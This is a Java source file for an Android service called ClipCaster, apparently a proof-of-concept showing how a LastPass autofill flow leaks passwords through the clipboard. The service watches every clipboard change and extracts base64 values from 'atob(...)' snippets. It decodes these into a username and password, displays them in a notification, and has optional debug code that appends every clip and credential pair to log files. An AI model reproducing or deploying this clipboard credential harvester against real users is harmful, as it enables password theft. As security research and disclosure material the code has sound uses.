/*
 * Copyright (c) 2014 Xiao Bao Clark
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

package clipcaster.scrap.com.actisec.clipcaster;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.text.Html;
import android.text.Spanned;
import android.util.Base64;
import android.util.Pair;
import android.widget.Toast;

import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author Xiao Bao Clark
 */
public class ClipCasterService extends Service {

    public static final List<String> mClips = new ArrayList<String>();
    private static final int NOTIF_ID = 0xface1345;
    public static final String CLIPLOG_FILENAME = "clip.log";
    public static final String CREDLOG_FILENAME = "creds.log";

    private ClipboardManager.OnPrimaryClipChangedListener mListener = new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
        final ClipData primaryClip = getManager().getPrimaryClip();
        StringBuilder builder = new StringBuilder();
        for(int i = 0; i < primaryClip.getItemCount(); i++){
            builder.append(primaryClip.getItemAt(i).coerceToText(ClipCasterService.this));
            if(i != primaryClip.getItemCount() - 1){
                builder.append('\n');
            }
        }
        onClip(builder.toString());
        }
    };

    public static String currentTimestamp(){
        Calendar cal = Calendar.getInstance();
        cal.getTime();
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
        return sdf.format(cal.getTime());
    }

    void onClip(String text){
        mClips.add(text);
        final Pair<String, String> creds = getCreds(text);
        if(creds != null){
            try {
                postNotification(creds);
            } catch (IllegalArgumentException e){
                toast(this,"Error retrieving password from LastPass",false);
            }
        }
//        onClipDebug(text,creds);
    }

    void onClipDebug(final String text, final Pair<String,String> creds){
        System.out.println(text);
        writeToFile(CLIPLOG_FILENAME, text);
        if(creds != null) {
            writeToFile(CREDLOG_FILENAME, creds.first + "/" + creds.second);
        }
    }

    void writeToFile(String name, String text){
        BufferedWriter writer = null;
        try {
            writer = new BufferedWriter(new PrintWriter(openFileOutput(name, MODE_APPEND)));
            writer.write(currentTimestamp() + ": " + text);
            writer.newLine();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
    public static Pair<String,String> getCreds(String string){
        Pattern p = Pattern.compile(REGEX);
        //  get a matcher object
        Matcher m = p.matcher(string);
        List<String> creds = new ArrayList<String>(2);
        while(m.find()) {
            creds.add(m.group(1));
        }
        if(creds.isEmpty()) return null;
        return new Pair<String, String>(new String(Base64.decode(creds.get(0).getBytes(),0)),new String(Base64.decode(creds.get(1).getBytes(), 0)));
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public void postNotification(Pair<String, String> what){
        Notification.Builder builder = new Notification.Builder(this);
        builder.setContentTitle(getString(R.string.creds_notif_title));
        builder.setSmallIcon(R.drawable.ic_launcher);

        Spanned contentText = Html.fromHtml(getString(R.string.creds_notif_content, what.first, what.second));
        Spanned contentTextBig = Html.fromHtml(getString(R.string.creds_notif_content_big, what.first, what.second));

        builder.setContentText(contentText);
        builder.setContentIntent(PendingIntent.getActivity(this, 0,new Intent(this, MyActivity.class),0));
        builder.setTicker(contentText);

        builder.setStyle(new Notification.BigTextStyle().bigText(contentTextBig));
        Notification n = builder.build();
        ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).notify(NOTIF_ID, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        return START_STICKY;
    }

    @Override
    public IBinder onBind(final Intent intent) {
        return null;
    }

    @Override
    public void onCreate(){
        toast(this, "ClipCaster service starting", false);
        getManager().addPrimaryClipChangedListener(mListener);
    }

    @Override
    public void onDestroy(){
        toast(this, "ClipCaster service stopping", false);
        getManager().removePrimaryClipChangedListener(mListener);
    }

    public static void toast(final Context context, final String message, final boolean showLonger){
        new Handler(context.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                android.widget.Toast.makeText(context, message, (showLonger ? android.widget.Toast.LENGTH_LONG : Toast.LENGTH_SHORT)).show();
            }
        });
    }

    ClipboardManager getManager(){
        return (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
    }
}
